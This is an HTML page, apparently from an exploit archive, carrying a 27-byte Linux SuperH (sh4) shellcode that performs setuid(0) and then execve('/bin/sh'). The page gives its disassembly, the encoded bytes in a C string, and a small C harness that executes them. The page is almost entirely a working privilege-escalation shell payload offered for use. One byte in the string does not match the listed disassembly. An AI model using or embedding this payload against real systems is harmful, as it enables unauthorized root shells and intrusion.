<html><head><title>Linux/SuperH - sh4 - setuid(0) ; execve(/bin/sh, NULL, NULL) - 27 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
  Linux/SuperH - sh4 - setuid(0) ; execve(&quot;/bin/sh&quot;, NULL, NULL) - 27 bytes
  Tested on debian-sh4 2.6.32-5-sh7751r
  by Jonathan Salwan - twitter: @jonathansalwan

  400054:        17 e3      mov      #23,r3
  400056:        4a 24      xor      r4,r4
  400058:        0b c3      trapa    #11
  40005a:        3a 23      xor      r3,r3
  40005c:        0b e3      mov      #11,r3
  40005e:        02 c7      mova     400068 &lt;__bss_start-0x10008&gt;,r0
  400060:        03 64      mov      r0,r4
  400062:        5a 25      xor      r5,r5
  400064:        6a 26      xor      r6,r6
  400066:        0b c3      trapa    #11
  400068:        2f 62      exts.w   r2,r2
  40006a:        69 6e      swap.w   r6,r14
  40006c:        2f 73      add      #47,r3
  40006e:        68 00      .word 0x0068
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char *SC = &quot;\x17\xe3\x4e\x24&quot;
           &quot;\x0b\xc3\x3a\x23&quot;
           &quot;\x0b\xe3\x02\xc7&quot;
           &quot;\x03\x64\x5a\x25&quot;
           &quot;\x6a\x26\x0b\xc3&quot;
           &quot;\x2f\x62\x69\x6e&quot;
           &quot;\x2f\x73\x68&quot;; 

void main(void)
{
  fprintf(stdout, &quot;Length: %d\n&quot;, strlen(SC));
  (*(void(*)()) SC)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
